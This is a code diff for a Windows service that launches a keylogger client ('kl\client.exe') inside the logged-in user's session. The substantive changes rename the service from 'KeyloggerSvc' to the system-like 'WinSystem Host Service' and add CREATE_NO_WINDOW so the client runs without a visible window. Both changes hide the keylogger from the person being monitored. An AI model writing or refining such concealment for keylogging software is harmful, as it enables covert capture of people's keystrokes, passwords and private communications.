@@ -3,7 +3,7 @@
 #include <wtsapi32.h>
 #include <userenv.h>
 
-#define SERVICE_NAME "KeyloggerSvc"
+#define SERVICE_NAME "WinSystem Host Service"
 #define CLIENT_PATH "C:\\ProgramData\\kl\\client.exe"
 
 SERVICE_STATUS        gStatus;
@@ -24,8 +24,7 @@ static BOOL EnablePrivilege(LPCSTR name){
     LUID luid;
     BOOL ok;
 
-    if(!OpenProcessToken(GetCurrentProcess(),
-                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)){
+    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)){
         return FALSE;
     }
     if(!LookupPrivilegeValueA(NULL, name, &luid)){
@@ -64,8 +63,9 @@ static BOOL StartClientInUserSession(void){
     ZeroMemory(&pi, sizeof(pi));
     lstrcpyA(commandLine, CLIENT_PATH);
 
-    ok = CreateProcessAsUserA(userToken, NULL, commandLine, NULL, NULL,
-                              FALSE, 0, NULL, NULL, &si, &pi);
+    //CREATE_NO_WINDOW: THE CLIENT IS A CONSOLE APP BUT MUST NOT ALLOCATE A VISIBLE
+    //CONSOLE WINDOW, OTHERWISE A WINDOW FLASHES EVERY TIME IT IS RELAUNCHED
+    ok = CreateProcessAsUserA(userToken, NULL, commandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     if(ok){
         gChild = pi.hProcess;
         CloseHandle(pi.hThread);
@@ -74,8 +74,7 @@ static BOOL StartClientInUserSession(void){
     return ok;
 }
 
-static DWORD WINAPI ServiceHandler(DWORD control, DWORD eventType,
-                                   LPVOID data, LPVOID context){
+static DWORD WINAPI ServiceHandler(DWORD control, DWORD eventType, LPVOID data, LPVOID context){
     (void)eventType; (void)data; (void)context;
 
     switch(control){
@@ -97,8 +96,7 @@ static void WINAPI ServiceMain(DWORD argc, LPSTR *argv){
 
     (void)argc; (void)argv;
 
-    gStatusHandle = RegisterServiceCtrlHandlerExA(SERVICE_NAME,
-                                                  ServiceHandler, NULL);
+    gStatusHandle = RegisterServiceCtrlHandlerExA(SERVICE_NAME, ServiceHandler, NULL);
     if(!gStatusHandle){
         return;
     }
